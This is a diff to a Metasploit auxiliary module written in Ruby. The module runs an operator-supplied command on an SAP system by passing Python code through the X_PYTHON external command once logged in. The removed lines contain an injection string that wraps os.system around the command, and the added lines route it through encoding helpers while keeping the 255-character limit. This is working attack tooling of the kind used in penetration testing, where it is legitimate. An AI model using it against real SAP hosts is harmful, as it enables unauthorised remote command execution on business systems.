@@ -47,23 +47,17 @@ class Metasploit4 < Msf::Auxiliary
         fail_with(Exploit::Failure::BadConfig, "CLIENT in wrong format")
     end
 
-    cmd = datastore['CMD']
+    cmd = encode_command_python(datastore['CMD'])
+    exec = encode_python(cmd)
 
-    if cmd.include? "'"
-      print_warning("#{rhost}:#{rport} [SAP] Command contains ' attempting to escape...")
-      cmd.gsub!("'","\\\\\\\\\\\"")
-    end
-
-    single_line = "-c '%exec(\"import os\"+chr(59)+\"print os.system(\\\"#{cmd}\\\")\")%'"
-
-    if single_line.length > 255
+    if exec.length > 255
       # do python stager to file like exploit if needed
-      print_error("#{rhost}:#{rport} [SAP] Encoded command length must not exceed 255 characters - #{single_line.length}")
+      print_error("#{rhost}:#{rport} [SAP] Encoded command length must not exceed 255 characters - #{exec.length}")
     else
       opts = {
         :OPERATINGSYSTEM => 'ANYOS',
         :COMMANDNAME => 'X_PYTHON',
-        :ADDITIONAL_PARAMETERS => single_line
+        :ADDITIONAL_PARAMETERS => exec
       }
 
       login(rhost, rport, client, user, password) do |conn|
@@ -74,7 +68,7 @@ class Metasploit4 < Msf::Auxiliary
     if res
       print_line res
     else
-      print_error("#{rhost}:#{rport} [SAP] No response from cmd '#{cmd}'")
+      print_error("#{rhost}:#{rport} [SAP] No response from cmd '#{datastore['CMD']}'")
     end
   end
 
